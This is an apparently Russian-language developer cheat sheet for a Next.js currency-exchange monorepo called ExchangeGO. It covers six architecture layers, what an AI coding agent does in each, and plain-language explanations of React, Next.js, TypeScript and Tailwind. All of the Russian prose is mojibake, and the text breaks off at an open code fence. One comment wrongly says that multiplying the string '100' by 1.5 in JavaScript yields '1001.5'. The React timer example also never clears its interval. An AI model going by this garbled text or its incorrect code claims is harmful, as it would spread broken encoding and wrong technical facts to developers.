# üéØ –®–ø–∞—Ä–≥–∞–ª–∫–∞ –ø–æ –ø—Ä–æ–µ–∫—Ç—É ExchangeGO –¥–ª—è –∏–Ω–∂–µ–Ω–µ—Ä–∞

> **–î–ª—è –∫–æ–≥–æ**: –ò–Ω–∂–µ–Ω–µ—Ä —Å —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–º –æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ–º, –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—á–µ—Ç –ø–æ–Ω–∏–º–∞—Ç—å —á—Ç–æ –¥–µ–ª–∞–µ—Ç AI –∞–≥–µ–Ω—Ç –ø—Ä–∏ –Ω–∞–ø–∏—Å–∞–Ω–∏–∏ –∫–æ–¥–∞, –Ω–æ –Ω–µ —Ä–∞–∑–±–∏—Ä–∞–µ—Ç—Å—è –≤ Next.js –≤ –¥–µ—Ç–∞–ª—è—Ö.

---

## üèóÔ∏è **–ê–†–•–ò–¢–ï–ö–¢–£–†–ê –ü–†–û–ï–ö–¢–ê - 6 –£–†–û–í–ù–ï–ô**

–ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ –ø—Ä–æ–µ–∫—Ç –∫–∞–∫ **6-—ç—Ç–∞–∂–Ω–æ–µ –∑–¥–∞–Ω–∏–µ**. –ö–∞–∂–¥—ã–π —ç—Ç–∞–∂ –∏–º–µ–µ—Ç —Å–≤–æ—é —Ä–æ–ª—å:

### üìä **–£—Ä–æ–≤–µ–Ω—å 1: –î–∞–Ω–Ω—ã–µ –∏ –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã** (`packages/constants/`, `packages/exchange-core/types/`)

**–ß—Ç–æ —ç—Ç–æ**: –§—É–Ω–¥–∞–º–µ–Ω—Ç –∑–¥–∞–Ω–∏—è - –≤—Å–µ –±–∞–∑–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ, —á–∏—Å–ª–∞, —Ç–µ–∫—Å—Ç—ã
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ —Å–ø—Ä–∞–≤–æ—á–Ω–∏–∫ –∫–æ–Ω—Å—Ç–∞–Ω—Ç –≤ Excel - –∫—É—Ä—Å—ã –≤–∞–ª—é—Ç, –ª–∏–º–∏—Ç—ã, –∫–æ–¥—ã —Å—Ç—Ä–∞–Ω
**–¢–µ—Ö–Ω–æ–ª–æ–≥–∏–∏**: TypeScript (—Å—Ç—Ä–æ–≥–∞—è —Ç–∏–ø–∏–∑–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö)
**–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫–æ–≥–¥–∞ AI –ø–∏—à–µ—Ç –∫–æ–¥**:

- ‚úÖ –ë–µ—Ä–µ—Ç –≥–æ—Ç–æ–≤—ã–µ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã –∏–∑ `@repo/constants`
- ‚ùå –ù–ï —Å–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–µ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã –≤ –∫–æ–¥–µ (DRY –ø—Ä–∏–Ω—Ü–∏–ø)

```typescript
// –ü—Ä–∏–º–µ—Ä: AI –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≥–æ—Ç–æ–≤—ã–µ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã
import { CURRENCY_CODES, EXCHANGE_LIMITS } from '@repo/constants';
// –í–º–µ—Å—Ç–æ –∑–∞—Ö–∞—Ä–¥–∫–æ–∂–µ–Ω–Ω—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π: const USD = 'USD'
```

---

### üîß **–£—Ä–æ–≤–µ–Ω—å 2: –£—Ç–∏–ª–∏—Ç—ã –∏ –í–∞–ª–∏–¥–∞—Ü–∏—è** (`packages/utils/`, `packages/exchange-core/utils/`)

**–ß—Ç–æ —ç—Ç–æ**: –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–æ–º–Ω–∞—Ç–∞ - –≤—Å–µ "–æ—Ç–≤–µ—Ä—Ç–∫–∏ –∏ –º–æ–ª–æ—Ç–∫–∏" –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –¥–∞–Ω–Ω—ã–º–∏
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –Ω–∞–±–æ—Ä —Ñ—É–Ω–∫—Ü–∏–π –≤ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–µ - —Å–ª–æ–∂–µ–Ω–∏–µ, —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ, –ø—Ä–æ–≤–µ—Ä–∫–∏
**–¢–µ—Ö–Ω–æ–ª–æ–≥–∏–∏**:

- **Zod** - –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç–∏ –¥–∞–Ω–Ω—ã—Ö (–∫–∞–∫ –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Å–ø–æ—Ä—Ç–∞)
- **Utility functions** - –≥–æ—Ç–æ–≤—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —á–∞—Å—Ç—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
  **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫–æ–≥–¥–∞ AI –ø–∏—à–µ—Ç –∫–æ–¥**:
- ‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≥–æ—Ç–æ–≤—ã–µ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä—ã –∏–∑ `@repo/utils/validation`
- ‚úÖ –ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
- ‚ùå –ù–ï —Å–æ–∑–¥–∞–µ—Ç –¥—É–±–ª–∏—Ä—É—é—â–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏

```typescript
// –ü—Ä–∏–º–µ—Ä: AI –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≥–æ—Ç–æ–≤—É—é –≤–∞–ª–∏–¥–∞—Ü–∏—é
import { validateOrderId } from '@repo/utils/validation';
// –í–º–µ—Å—Ç–æ –Ω–∞–ø–∏—Å–∞–Ω–∏—è –≤–∞–ª–∏–¥–∞—Ü–∏–∏ —Å –Ω—É–ª—è
```

---

### üåê **–£—Ä–æ–≤–µ–Ω—å 3: API –∏ –°–µ—Ä–≤–µ—Ä–Ω–∞—è –õ–æ–≥–∏–∫–∞** (`apps/web/src/server/`)

**–ß—Ç–æ —ç—Ç–æ**: –ö—É—Ö–Ω—è —Ä–µ—Å—Ç–æ—Ä–∞–Ω–∞ - –≥–¥–µ –≥–æ—Ç–æ–≤—è—Ç—Å—è "–±–ª—é–¥–∞" (–æ–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–æ–≤)
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∏–º–∞–µ—Ç –∫–Ω–æ–ø–∫—É, –∑–¥–µ—Å—å –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –≤—Å—è –ª–æ–≥–∏–∫–∞
**–¢–µ—Ö–Ω–æ–ª–æ–≥–∏–∏**:

- **tRPC** - —Å–≤—è–∑—å —Ñ—Ä–æ–Ω—Ç–∞ —Å –±—ç–∫–æ–º (–∫–∞–∫ —Ç–µ–ª–µ—Ñ–æ–Ω –º–µ–∂–¥—É –∑–∞–ª–æ–º –∏ –∫—É—Ö–Ω–µ–π)
- **TypeScript** - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —Ç–∏–ø–∏–∑–∞—Ü–∏—è –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞ –∫ –∫–ª–∏–µ–Ω—Ç—É
  **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫–æ–≥–¥–∞ AI –ø–∏—à–µ—Ç –∫–æ–¥**:
- ‚úÖ –°–æ–∑–¥–∞–µ—Ç API endpoints —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π —Ç–∏–ø–∏–∑–∞—Ü–∏–µ–π
- ‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç middleware –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
- ‚úÖ –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –æ—à–∏–±–∫–∏ —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ

```typescript
// –ü—Ä–∏–º–µ—Ä: AI —Å–æ–∑–¥–∞–µ—Ç typesafe API
export const exchangeRouter = t.router({
  createOrder: t.procedure
    .input(CreateOrderSchema) // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è
    .mutation(async ({ input }) => {
      // –ë–∏–∑–Ω–µ—Å-–ª–æ–≥–∏–∫–∞
    }),
});
```

---

### üé£ **–£—Ä–æ–≤–µ–Ω—å 4: –°–æ—Å—Ç–æ—è–Ω–∏–µ –∏ –•—É–∫–∏** (`packages/hooks/`)

**–ß—Ç–æ —ç—Ç–æ**: –¶–µ–Ω—Ç—Ä —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è - –≥–¥–µ —Ö—Ä–∞–Ω–∏—Ç—Å—è "–ø–∞–º—è—Ç—å" –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞ - —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª, —á—Ç–æ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è
**–¢–µ—Ö–Ω–æ–ª–æ–≥–∏–∏**:

- **Zustand** - –≥–ª–æ–±–∞–ª—å–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ (–∫–∞–∫ –æ–±—â–∞—è –¥–æ—Å–∫–∞ –æ–±—ä—è–≤–ª–µ–Ω–∏–π)
- **React Query** - –∫—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö —Å —Å–µ—Ä–≤–µ—Ä–∞
- **Custom hooks** - –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –ª–æ–≥–∏–∫–∞
  **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫–æ–≥–¥–∞ AI –ø–∏—à–µ—Ç –∫–æ–¥**:
- ‚úÖ –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≥–æ—Ç–æ–≤—ã–µ —Ö—É–∫–∏ –∏–∑ `@repo/hooks`
- ‚úÖ –°–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–µ —Ö—É–∫–∏ –¥–ª—è —Å–ª–æ–∂–Ω–æ–π –ª–æ–≥–∏–∫–∏
- ‚úÖ –£–ø—Ä–∞–≤–ª—è–µ—Ç loading —Å–æ—Å—Ç–æ—è–Ω–∏—è–º–∏

```typescript
// –ü—Ä–∏–º–µ—Ä: AI –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≥–æ—Ç–æ–≤–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ
import { useExchangeStore } from '@repo/hooks';

function ExchangeForm() {
  const { selectedCurrency, setSelectedCurrency } = useExchangeStore();
  // –°–æ—Å—Ç–æ—è–Ω–∏–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä—É–µ—Ç—Å—è –≤–µ–∑–¥–µ
}
```

---

### üé® **–£—Ä–æ–≤–µ–Ω—å 5: UI –ö–æ–º–ø–æ–Ω–µ–Ω—Ç—ã** (`packages/ui/`, `apps/web/src/components/`)

**–ß—Ç–æ —ç—Ç–æ**: –í–∏—Ç—Ä–∏–Ω–∞ –º–∞–≥–∞–∑–∏–Ω–∞ - —á—Ç–æ –≤–∏–¥–∏—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä LEGO - –≥–æ—Ç–æ–≤—ã–µ –∫–∏—Ä–ø–∏—á–∏–∫–∏ –¥–ª—è —Å–±–æ—Ä–∫–∏ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
**–¢–µ—Ö–Ω–æ–ª–æ–≥–∏–∏**:

- **shadcn/ui** - –≥–æ—Ç–æ–≤—ã–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã (–∫–Ω–æ–ø–∫–∏, —Ñ–æ—Ä–º—ã, –º–æ–¥–∞–ª—ã)
- **Tailwind CSS** - —Å—Ç–∏–ª–∏–∑–∞—Ü–∏—è (–∫–∞–∫ CSS –Ω–æ –±—ã—Å—Ç—Ä–µ–µ)
- **React** - –¥–≤–∏–∂–æ–∫ –¥–ª—è –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
  **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫–æ–≥–¥–∞ AI –ø–∏—à–µ—Ç –∫–æ–¥**:
- ‚úÖ –ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –∏–∑ `@repo/ui`
- ‚úÖ –ö–æ–º–±–∏–Ω–∏—Ä—É–µ—Ç –≥–æ—Ç–æ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –≤–º–µ—Å—Ç–æ —Å–æ–∑–¥–∞–Ω–∏—è —Å –Ω—É–ª—è
- ‚úÖ –°–ª–µ–¥—É–µ—Ç –¥–∏–∑–∞–π–Ω-—Å–∏—Å—Ç–µ–º–µ

```typescript
// –ü—Ä–∏–º–µ—Ä: AI —Å–æ–±–∏—Ä–∞–µ—Ç –∏–∑ –≥–æ—Ç–æ–≤—ã—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤
import { Button, Input, Select } from '@repo/ui';

function ExchangeForm() {
  return (
    <form>
      <Select>...</Select>  {/* –ì–æ—Ç–æ–≤—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç */}
      <Input>...</Input>    {/* –ì–æ—Ç–æ–≤—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç */}
      <Button>...</Button>  {/* –ì–æ—Ç–æ–≤—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç */}
    </form>
  );
}
```

---

### ‚öôÔ∏è **–£—Ä–æ–≤–µ–Ω—å 6: –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –∏ –ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è** (`apps/`, –∫–æ—Ä–Ω–µ–≤—ã–µ —Ñ–∞–π–ª—ã)

**–ß—Ç–æ —ç—Ç–æ**: –≠–ª–µ–∫—Ç—Ä–æ—â–∏—Ç–æ–∫ –∑–¥–∞–Ω–∏—è - –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –≤—Å–µ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞
**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã - –∫–∞–∫–∏–µ —è–∑—ã–∫–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—Ç—å, –∫–∞–∫ —Å–æ–±–∏—Ä–∞—Ç—å –ø—Ä–æ–µ–∫—Ç
**–¢–µ—Ö–Ω–æ–ª–æ–≥–∏–∏**:

- **Next.js** - —Ñ—Ä–µ–π–º–≤–æ—Ä–∫ –¥–ª—è –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
- **Turborepo** - —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤—Å–µ–º –ø—Ä–æ–µ–∫—Ç–æ–º –∫–∞–∫ —Ü–µ–ª—ã–º
- **TypeScript config** - –ø—Ä–∞–≤–∏–ª–∞ —Ç–∏–ø–∏–∑–∞—Ü–∏–∏
  **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –∫–æ–≥–¥–∞ AI –ø–∏—à–µ—Ç –∫–æ–¥**:
- ‚úÖ –†–µ–¥–∫–æ —Ç—Ä–æ–≥–∞–µ—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
- ‚úÖ –†–∞–±–æ—Ç–∞–µ—Ç –≤ —Ä–∞–º–∫–∞—Ö –≥–æ—Ç–æ–≤—ã—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫
- ‚úÖ –ï—Å–ª–∏ –º–µ–Ω—è–µ—Ç - –æ–±—ä—è—Å–Ω—è–µ—Ç –∑–∞—á–µ–º

---

## üõ†Ô∏è **–¢–ï–•–ù–û–õ–û–ì–ò–ß–ï–°–ö–ò–ô –°–¢–ï–ö –ü–û –ü–†–û–°–¢–û–ú–£**

> **–ö–∞–∂–¥–∞—è —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏—è –æ–±—ä—è—Å–Ω—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ –ø—Ä–æ—Å—Ç—ã–µ –∞–Ω–∞–ª–æ–≥–∏–∏ + –∑–∞—á–µ–º –Ω—É–∂–Ω–∞ –≤ –ø—Ä–æ–µ–∫—Ç–µ –æ–±–º–µ–Ω–∞ –≤–∞–ª—é—Ç**

---

### üé® **Frontend (—á—Ç–æ –≤–∏–¥–∏—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å)**

#### **React** - –î–≤–∏–∂–æ–∫ –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–æ—Ä LEGO –¥–ª—è —Å–∞–π—Ç–æ–≤
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: –ï—Å–ª–∏ HTML - —ç—Ç–æ –∫–∏—Ä–ø–∏—á–∏ –¥–æ–º–∞, —Ç–æ React - —ç—Ç–æ –ø—Ä–∞–≤–∏–ª–∞ –∫–∞–∫ —ç—Ç–∏ –∫–∏—Ä–ø–∏—á–∏ –º–æ–≥—É—Ç –∏–∑–º–µ–Ω—è—Ç—å—Å—è –∏ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å

**–ß—Ç–æ —ç—Ç–æ –∑–Ω–∞—á–∏—Ç –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏:**

```javascript
// –ë–µ–∑ React - —Å—Ç–∞—Ç–∏—á–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
<div>–ö—É—Ä—Å BTC: 45000$</div>; // –ö—É—Ä—Å –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –æ–±–Ω–æ–≤–∏—Ç—Å—è

// –° React - –∂–∏–≤–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
function CurrencyRate() {
  const [rate, setRate] = useState(45000);

  // –ö—É—Ä—Å –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –∫–∞–∂–¥—ã–µ 30 —Å–µ–∫—É–Ω–¥ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
  useEffect(() => {
    const interval = setInterval(() => {
      fetchLatestRate().then(setRate);
    }, 30000);
  }, []);

  return <div>–ö—É—Ä—Å BTC: {rate}$</div>; // –ö—É—Ä—Å –∂–∏–≤–æ–π!
}
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –ö—É—Ä—Å—ã –º–µ–Ω—è—é—Ç—Å—è –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É, —Ñ–æ—Ä–º—ã –¥–æ–ª–∂–Ω—ã —Ä–µ–∞–≥–∏—Ä–æ–≤–∞—Ç—å –Ω–∞ –≤–≤–æ–¥, –Ω—É–∂–Ω—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —Å—Ç–∞—Ç—É—Å–µ —Å–¥–µ–ª–æ–∫ - –±–µ–∑ React —ç—Ç–æ –±—ã–ª–æ –±—ã –æ—á–µ–Ω—å —Å–ª–æ–∂–Ω–æ.

---

#### **Next.js** - –§—Ä–µ–π–º–≤–æ—Ä–∫ –¥–ª—è React

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –≥–æ—Ç–æ–≤—ã–π —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç —Å –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏—è–º–∏ –¥–ª—è –¥–æ–º–∞
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: React –¥–∞–µ—Ç –∫–∏—Ä–ø–∏—á–∏, –∞ Next.js - –≥–æ—Ç–æ–≤—ã–π –ø–ª–∞–Ω –¥–æ–º–∞ —Å –≤–æ–¥–æ–ø—Ä–æ–≤–æ–¥–æ–º, —ç–ª–µ–∫—Ç—Ä–∏—á–µ—Å—Ç–≤–æ–º –∏ –æ—Ç–æ–ø–ª–µ–Ω–∏–µ–º

**–ß—Ç–æ Next.js –¥–∞–µ—Ç –∏–∑ –∫–æ—Ä–æ–±–∫–∏:**

- **–†–æ—É—Ç–∏–Ω–≥**: `/exchange` –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤–µ–¥–µ—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –æ–±–º–µ–Ω–∞
- **SSR/SSG**: –°—Ç—Ä–∞–Ω–∏—Ü—ã –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è –º–≥–Ω–æ–≤–µ–Ω–Ω–æ (SEO + —Å–∫–æ—Ä–æ—Å—Ç—å)
- **API Routes**: –ú–æ–∂–Ω–æ –ø–∏—Å–∞—Ç—å –±—ç–∫–µ–Ω–¥ –≤ —Ç–æ–º –∂–µ –ø—Ä–æ–µ–∫—Ç–µ
- **–û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è**: –ö–∞—Ä—Ç–∏–Ω–∫–∏, —à—Ä–∏—Ñ—Ç—ã, –∫–æ–¥ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ–ø—Ç–∏–º–∏–∑–∏—Ä—É—é—Ç—Å—è
- **Hot Reload**: –ò–∑–º–µ–Ω–µ–Ω–∏—è –≤ –∫–æ–¥–µ –≤–∏–¥–Ω—ã –º–≥–Ω–æ–≤–µ–Ω–Ω–æ

**–ü—Ä–∏–º–µ—Ä —Å—Ç—Ä—É–∫—Ç—É—Ä—ã:**

```
apps/web/
  app/
    page.tsx          ‚Üí https://site.com/           (–≥–ª–∞–≤–Ω–∞—è)
    exchange/
      page.tsx        ‚Üí https://site.com/exchange   (–æ–±–º–µ–Ω)
    orders/
      [id]/
        page.tsx      ‚Üí https://site.com/orders/123 (–∑–∞–∫–∞–∑)
  api/
    trpc/[trpc].ts    ‚Üí https://site.com/api/trpc   (API)
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: SEO –≤–∞–∂–µ–Ω –¥–ª—è –ø—Ä–∏–≤–ª–µ—á–µ–Ω–∏—è –∫–ª–∏–µ–Ω—Ç–æ–≤, –±—ã—Å—Ç—Ä–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ –∫—Ä–∏—Ç–∏—á–Ω–∞ (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ —É–π–¥—É—Ç –µ—Å–ª–∏ –¥–æ–ª–≥–æ), API –Ω—É–∂–µ–Ω –¥–ª—è —Å–¥–µ–ª–æ–∫.

---

#### **TypeScript** - JavaScript —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –æ—à–∏–±–æ–∫

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –ø—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ä—Ñ–æ–≥—Ä–∞—Ñ–∏–∏ –≤ Word, –Ω–æ –¥–ª—è –∫–æ–¥–∞
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: JavaScript –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–ø–∏—Å–∞—Ç—å —á—Ç–æ —É–≥–æ–¥–Ω–æ, TypeScript –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —á—Ç–æ –≤—ã –Ω–∞–ø–∏—Å–∞–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ

**–ü—Ä–æ–±–ª–µ–º–∞ JavaScript:**

```javascript
// JavaScript - –æ—à–∏–±–∫–∏ —Ç–æ–ª—å–∫–æ –≤–æ –≤—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã
function calculateExchange(amount, rate) {
  return amount * rate; // –ê —á—Ç–æ –µ—Å–ª–∏ amount - —Å—Ç—Ä–æ–∫–∞?
}

calculateExchange('100', 1.5); // = "1001.5" üò± (—Å—Ç—Ä–æ–∫–∞!)
calculateExchange(null, 1.5); // = 0 üò± (–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ!)
calculateExchange(100, 'invalid'); // = NaN üò± (—Å–ª–æ–º–∞–Ω–æ!)
```

**–†–µ—à–µ–Ω–∏–µ TypeScript:**

```typescript
// TypeScript - –æ—à–∏–±–∫–∏ –Ω–∞ —ç—Ç–∞–ø–µ –Ω–∞–ø–∏—Å–∞–Ω–∏—è –∫–æ–¥–∞
function calculateExchange(amount: number, rate: number): number {
  return amount * rate;
}

calculateExchange('100', 1.5); // ‚ùå –û—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏!
calculateExchange(null, 1.5); // ‚ùå –û—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏!
calculateExchange(100, 'invalid'); // ‚ùå –û—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏!
calculateExchange(100, 1.5); // ‚úÖ –†–∞–±–æ—Ç–∞–µ—Ç –ø—Ä–∞–≤–∏–ª—å–Ω–æ
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –û—à–∏–±–∫–∏ —Å –¥–µ–Ω—å–≥–∞–º–∏ –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º—ã. TypeScript –Ω–µ –¥–∞—Å—Ç –ø–µ—Ä–µ–ø—É—Ç–∞—Ç—å —Å—É–º–º—É —Å–æ —Å—Ç—Ä–æ–∫–æ–π –∏–ª–∏ –∑–∞–±—ã—Ç—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω—É–∂–Ω–æ–µ –ø–æ–ª–µ.

---

#### **Tailwind CSS** - –ë—ã—Å—Ç—Ä–∞—è —Å—Ç–∏–ª–∏–∑–∞—Ü–∏—è

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –Ω–∞–±–æ—Ä –≥–æ—Ç–æ–≤—ã—Ö Instagram —Ñ–∏–ª—å—Ç—Ä–æ–≤ –¥–ª—è –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: –í–º–µ—Å—Ç–æ —Ä–∏—Å–æ–≤–∞–Ω–∏—è –∫–∞–∂–¥–æ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞ —Å –Ω—É–ª—è, –ø—Ä–∏–º–µ–Ω—è–µ—à—å –≥–æ—Ç–æ–≤—ã–µ —Å—Ç–∏–ª–∏

**–°—Ç–∞—Ä—ã–π —Å–ø–æ—Å–æ–± (CSS):**

```css
/* –ù—É–∂–Ω–æ –ø–∏—Å–∞—Ç—å –º–Ω–æ–≥–æ CSS –∫–æ–¥–∞ */
.exchange-button {
  background-color: #3b82f6;
  color: white;
  padding: 12px 24px;
  border-radius: 8px;
  border: none;
  font-weight: 600;
  transition: background-color 0.2s;
}

.exchange-button:hover {
  background-color: #2563eb;
}
```

**–ù–æ–≤—ã–π —Å–ø–æ—Å–æ–± (Tailwind):**

```jsx
